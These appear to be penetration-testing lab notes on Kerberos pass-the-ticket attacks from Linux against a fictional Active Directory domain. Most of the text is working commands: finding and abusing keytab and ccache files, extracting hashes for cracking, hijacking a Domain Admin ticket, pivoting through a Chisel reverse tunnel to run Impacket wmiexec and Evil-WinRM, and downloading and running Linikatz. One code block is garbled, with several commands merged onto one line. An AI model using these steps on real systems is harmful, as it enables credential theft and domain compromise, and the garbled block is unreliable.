
> ⚠️ Kerberos tickets are time-limited and tied to renewal windows — always check `klist` expiration before relying on a captured ticket. Root/elevated access is required to read other users' ccache files and keytabs.

---
## 1. Background
- Linux boxes can be domain-joined to AD for centralized identity (single identity across Linux + Windows).
- Domain-joined Linux typically authenticates via **Kerberos**.
- **Note:** a Linux box does _not_ need to be domain-joined to use Kerberos tickets — they can still be used in scripts or for network auth independently.

### Key File Types

| Type       | Purpose                                                                                                                                                                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **ccache** | Credential cache — holds a user's live Kerberos tickets, usually in `/tmp`, path set via `KRB5CCNAME` env var                                                                         |
| **keytab** | File containing Kerberos principal + encrypted key pairs (derived from password) — lets scripts authenticate without a plaintext password. Must be recreated if the password changes. |
|            |                                                                                                                                                                                       |

> Any machine with a Kerberos client can create keytabs; they aren't restricted to their originating host and can be copied elsewhere.

---

## 2. Identifying AD Integration

### `realm list`

```bash
realm list
```

```
inlanefreight.htb
  type: kerberos
  server-software: active-directory
  client-software: sssd
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Confirms Kerberos membership, domain name, and which users/groups can log in locally.

### Fallback — Check Running Services

```bash
ps -ef | grep -i "winbind\|sssd"
```

Presence of `sssd` or `winbind` processes confirms AD integration even without `realm`.

---

## 3. Finding Kerberos Tickets

### A. KeyTab Files

**Search by filename:**

```bash
find / -name *keytab* -ls 2>/dev/null
```

```
-rw-------  root root  /etc/krb5.keytab
-rw-rw-rw-  root root  /opt/specialfiles/carlos.keytab
```

> `/etc/krb5.keytab` = the machine account's own ticket (e.g., `LINUX01$@INLANEFREIGHT.HTB`) — root-readable only.

**Look inside scripts/cronjobs** (keytabs don't have to use the `.keytab` extension):

```bash
crontab -l
cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/.../svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
```

> `kinit` requests/imports a TGT into the ccache — its presence in a script confirms Kerberos use and often reveals a keytab path/filename that lacks the `.keytab` extension.

### B. ccache Files

```bash
env | grep -i krb5
```

```
KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

List all live tickets (needs root to read other users'):

```bash
ls -la /tmp
```

```
-rw------- julio@inlanefreight.htb   krb5cc_647401106_tBswau
-rw------- david@inlanefreight.htb   krb5cc_647401107_Gf415d
-rw------- carlos@inlanefreight.htb  krb5cc_647402606_qd2Pfh
```

---

## 4. Abusing KeyTab Files

### Identify the Principal

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```

```
Principal: carlos@INLANEFREIGHT.HTB
```

### Impersonate via `kinit`

```bash
klist   # check current ticket first
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist   # confirm switch to carlos's principal
```

> `kinit` is **case-sensitive** — match `klist`'s casing exactly (user lowercase, realm uppercase). 💾 Save your original ccache (`$KRB5CCNAME`) before overwriting it, so you can restore your own session later.

### Use the New Ticket

```bash
smbclient //dc01/carlos -k -c ls
```

### Extract Hashes for Offline Cracking — KeyTabExtract

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```
NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
AES-256 HASH : 42ff0baa...
AES-128 HASH : fa74d5ab...
```

- **NTLM hash** → Pass-the-Hash, or crack with Hashcat/John/crackstation.net
- **AES hashes** → forge tickets (Rubeus) or crack for plaintext

> A single keytab can contain multiple principals/hash types, even merged from different users.

### Login With Cracked Password

```bash
su - carlos@inlanefreight.htb
```

Repeat the process against any other keytabs found (e.g., a cronjob's `svc_workstations.kt`) to chain further access.

---

## 5. Abusing ccache Files

Only need **read** access to the file. Root can read everyone's `/tmp/krb5cc_*`.

### Example Chain

1. Log in as `svc_workstations` (cracked earlier).
2. Check `sudo -l` → find `(ALL) ALL` → `sudo su` → root.
3. As root, enumerate all ccache files in `/tmp`.
4. Check group membership of interesting users:
    
    ```bash
    id julio@inlanefreight.htb
    ```
    
    ```
    groups=...,domain admins@inlanefreight.htb,...
    ```
    
    → Julio is a **Domain Admin**.
5. Hijack Julio's ticket:
    
    ```bash
    cp /tmp/krb5cc_647401106_I8I133 .export KRB5CCNAME=/root/krb5cc_647401106_I8I133klist   # confirms: Default principal: julio@INLANEFREIGHT.HTBsmbclient //dc01/C$ -k -c ls -no-pass
    ```
    
    → Full access to the DC's C$ share as a Domain Admin.

> ⏰ Always check `klist`'s "Valid starting"/"Expires" — ccache files are temporary and can expire or get replaced on logout/login.

---

## 6. Using Linux Attack Tools With Kerberos (from a Non-Domain Attack Host)

If your attack host **isn't** domain-joined, it needs:
1. Name resolution for the domain/DC (hardcode `/etc/hosts` if needed)
2. Network reachability to the KDC — often via a pivot (e.g., Chisel + Proxychains through a compromised domain-joined host like MS01)

### Setup Example

```bash
cat /etc/hosts
```

```
172.16.1.10 inlanefreight.htb dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

```bash
cat /etc/proxychains.conf
```

```
[ProxyList]
socks5 127.0.0.1 1080
```

### Stand Up Chisel Reverse Tunnel
Attack host (server):
```bash
sudo ./chisel server --reverse
```

Pivot host MS01 (client, via RDP):
```cmd
chisel.exe client <attack_host_ip>:8080 R:socks
```

### Import the Stolen Ticket
```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

### Impacket over Kerberos

```bash
proxychains impacket-wmiexec dc01 -k
```
- Use the **hostname**, not IP, with `-k` (Kerberos auth) and `-no-pass` if prompted.
- Note: some Linux AD implementations prefix `KRB5CCNAME` with `FILE:` — strip that prefix if a tool errors out on the path.

### Evil-WinRM over Kerberos

Install Kerberos client package (Debian-based):

```bash
sudo apt-get install krb5-user -y
```

Configure `/etc/krb5.conf`:

```
[libdefaults]
    default_realm = INLANEFREIGHT.HTB
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Connect:
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

## 7. Ticket Format Conversion — `ticketConverter`

Convert between Linux **ccache** and Windows **kirbi** formats:

```bash
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

Import a `.kirbi` into a Windows session with Rubeus:

```powershell
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

---

## 8. Linikatz — "Mimikatz for Linux/UNIX"

- Built by Cisco's security team; extracts credentials (Kerberos tickets, hashes) from AD-integrated Linux implementations: **FreeIPA, SSSD, Samba, Vintella**, etc.
- **Requires root.**
- Dumps results into a `linikatz.*` output folder in ccache/keytab formats, ready to reuse with the techniques above.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

Output includes machine account tickets (`LINUX01$@INLANEFREIGHT.HTB`) and any live user tickets found on the host.

---

## Summary

|Goal|Tool/Technique|
|---|---|
|Check AD integration|`realm list`, `ps -ef \| grep sssd\|winbind`|
|Find keytabs|`find / -name *keytab*`, check cronjobs/scripts|
|Find ccache files|`env \| grep krb5`, `ls -la /tmp`|
|Impersonate via keytab|`klist -k -t`, `kinit -k -t`|
|Extract keytab hashes|`keytabextract.py` → crack NTLM/AES offline|
|Impersonate via ccache|Copy file, `export KRB5CCNAME=<path>`|
|Attack from non-domain host|Chisel + Proxychains + hardcoded `/etc/hosts`|
|Use ticket with Impacket|`impacket-wmiexec <host> -k -no-pass`|
|Use ticket with Evil-WinRM|`krb5-user` package + `/etc/krb5.conf` + `-r <realm>`|
|Convert ticket formats|`impacket-ticketConverter` (ccache ↔ kirbi)|
|Dump all AD creds on host|**Linikatz** (root required)|

## Key Takeaways

- Kerberos ticket theft on Linux mirrors Windows PtT — just different storage/tooling (ccache/keytab vs. Windows ticket cache).
- Root access unlocks reading **any** user's ccache/keytab on the box — always check `id` on discovered principals for high-value group memberships (e.g., Domain Admins).
- Keytabs are especially valuable: they don't expire like ccache tickets and can be extracted for offline cracking.
- Pivoting tools (Chisel/Proxychains) + `/etc/hosts` hardcoding let you use Kerberos tickets from attack hosts outside the domain.